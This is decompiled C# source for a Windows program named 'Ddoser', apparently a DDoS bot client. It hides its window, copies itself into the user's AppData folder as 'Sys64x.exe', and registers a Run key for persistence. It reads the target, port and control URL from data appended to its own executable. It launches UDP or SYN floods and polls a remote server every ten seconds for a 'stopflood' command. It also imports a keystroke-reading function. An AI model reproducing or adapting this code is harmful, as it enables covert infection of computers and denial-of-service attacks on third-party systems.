using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace Ddoser;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("RadioButton3")]
	private RadioButton _RadioButton3;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	private NetFlood net;

	private string[] options;

	private string text1;

	private string text2;

	private string text3;

	private string udp;

	private string ssyn;

	private int result;

	private const string FileSplit = "booter";

	private RegistryKey rkApp;

	internal virtual TextBox TextBox2
	{
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer1_Tick;
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick(eventHandler);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual RadioButton RadioButton1
	{
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual RadioButton RadioButton3
	{
		get
		{
			return _RadioButton3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_RadioButton3 = value;
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual TextBox TextBox4
	{
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox4 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		net = new NetFlood();
		rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Expected O, but got Unknown
		components = new Container();
		TextBox2 = new TextBox();
		TextBox3 = new TextBox();
		TextBox1 = new TextBox();
		Timer1 = new Timer(components);
		RadioButton1 = new RadioButton();
		RadioButton2 = new RadioButton();
		RadioButton3 = new RadioButton();
		Timer2 = new Timer(components);
		TextBox4 = new TextBox();
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox2;
		Point location = new Point(0, 63);
		((Control)textBox).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox2 = TextBox2;
		Size size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		TextBox textBox3 = TextBox3;
		location = new Point(12, 124);
		((Control)textBox3).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox4 = TextBox3;
		size = new Size(100, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox3).set_TabIndex(2);
		TextBox textBox5 = TextBox1;
		location = new Point(12, 191);
		((Control)textBox5).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox6 = TextBox1;
		size = new Size(262, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox1).set_TabIndex(3);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(208, 100);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(4);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		RadioButton radioButton3 = RadioButton2;
		location = new Point(217, 168);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton4 = RadioButton2;
		size = new Size(90, 17);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton2).set_TabIndex(5);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("RadioButton2");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton3).set_AutoSize(true);
		RadioButton radioButton5 = RadioButton3;
		location = new Point(208, 230);
		((Control)radioButton5).set_Location(location);
		((Control)RadioButton3).set_Name("RadioButton3");
		RadioButton radioButton6 = RadioButton3;
		size = new Size(90, 17);
		((Control)radioButton6).set_Size(size);
		((Control)RadioButton3).set_TabIndex(6);
		RadioButton3.set_TabStop(true);
		((ButtonBase)RadioButton3).set_Text("RadioButton3");
		((ButtonBase)RadioButton3).set_UseVisualStyleBackColor(true);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(10000);
		TextBox textBox7 = TextBox4;
		location = new Point(21, 230);
		((Control)textBox7).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox8 = TextBox4;
		size = new Size(100, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox4).set_TabIndex(7);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(359, 259);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)TextBox4);
		((Control)this).get_Controls().Add((Control)(object)RadioButton3);
		((Control)this).get_Controls().Add((Control)(object)RadioButton2);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)TextBox3);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Form)this).set_FormBorderStyle((FormBorderStyle)5);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(long vKey);

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_ShowIcon(false);
		rkApp.SetValue("dick", "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sys64x.exe");
		string text = Application.get_ExecutablePath().ToString();
		string text2 = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Sys64x.exe";
		FileSystem.FileCopy(text, text2);
		((Control)this).Hide();
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			text1 = Strings.Space((int)FileSystem.LOF(1));
			this.text2 = Strings.Space((int)FileSystem.LOF(1));
			text3 = Strings.Space((int)FileSystem.LOF(1));
			udp = Strings.Space((int)FileSystem.LOF(1));
			ssyn = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text1, -1L, false);
			FileSystem.FileGet(1, ref this.text2, -1L, false);
			FileSystem.FileGet(1, ref text3, -1L, false);
			FileSystem.FileGet(1, ref udp, -1L, false);
			FileSystem.FileGet(1, ref ssyn, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			options = Strings.Split(text1, "booter", -1, (CompareMethod)0);
			TextBox2.set_Text(options[1]);
			TextBox3.set_Text(options[2]);
			TextBox1.set_Text(options[3]);
			RadioButton1.set_Checked(Conversions.ToBoolean(options[4]));
			RadioButton2.set_Checked(Conversions.ToBoolean(options[5]));
			if (RadioButton1.get_Checked())
			{
				net.StartUdp(TextBox2.get_Text(), Conversions.ToInteger(TextBox3.get_Text()));
			}
			else if (RadioButton2.get_Checked())
			{
				net.StartSSYN(TextBox2.get_Text(), Conversions.ToInteger(TextBox3.get_Text()));
			}
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		NetFlood netFlood = new NetFlood();
		try
		{
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(TextBox1.get_Text());
			HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
			TextBox4.set_Text(streamReader.ReadToEnd());
			if (TextBox4.get_Text().Contains("stopflood"))
			{
				netFlood.StopFloods();
			}
			else if (!netFlood.IsFlooding)
			{
				netFlood.StartUdp(TextBox2.get_Text(), Conversions.ToInteger(TextBox3.get_Text()));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
